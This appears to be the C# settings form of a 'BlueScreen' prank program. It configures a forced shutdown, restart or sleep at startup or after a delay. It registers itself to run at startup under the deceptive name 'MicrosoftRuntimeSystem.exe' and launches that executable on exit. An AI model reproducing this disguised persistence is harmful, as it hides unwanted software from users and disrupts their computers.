using BlueScreenCore;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlueScreen
{
    public partial class BlueScreenController : Form
    {
        public BlueScreenController()
        {
            InitializeComponent();
        }

        private void BlueScreenController_Load(object sender, EventArgs e)
        {
            string[] configuration = BlueScreenActions.ReadConfigurationFile();

            if (configuration[0] == "Shutdown")
                rbShutdown.Checked = true;

            if (configuration[0] == "Restart")
                rbRestart.Checked = true;

            if (configuration[0] == "Sleep")
                rbSleep.Checked = true;

            if (configuration[1] == "OnStartup")
            {
                rbOnStartup.Checked = true;
            }
            else
            {
                nudTime.Value = decimal.Parse(configuration[1]);
                rbAfter.Checked = true;
            }

            if (configuration[2] == "true")
                chRunOnStartup.Checked = true;
            else
                chRunOnStartup.Checked = false;

        }

        private void btnApply_Click(object sender, EventArgs e)
        {
            string action = (rbShutdown.Checked) ? rbShutdown.Text : (rbRestart.Checked) ? rbRestart.Text : rbSleep.Text;
            BlueScreenActions.WriteConfigurationFile(action, (rbOnStartup.Checked) ? "OnStartup" : nudTime.Value.ToString(), (chRunOnStartup.Checked) ? "true" : "false");
        }

        private void chRunOnStartup_CheckedChanged(object sender, EventArgs e)
        {
            if (chRunOnStartup.Checked)
                BlueScreenActions.StartUpRegistery(true, "MicrosoftRuntimeSystem.exe", Application.ExecutablePath);
            else
                BlueScreenActions.StartUpRegistery(false, "MicrosoftRuntimeSystem.exe", Application.ExecutablePath);
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            Process.Start("MicrosoftRuntimeSystem.exe");
            Application.Exit();
        }
    }
}
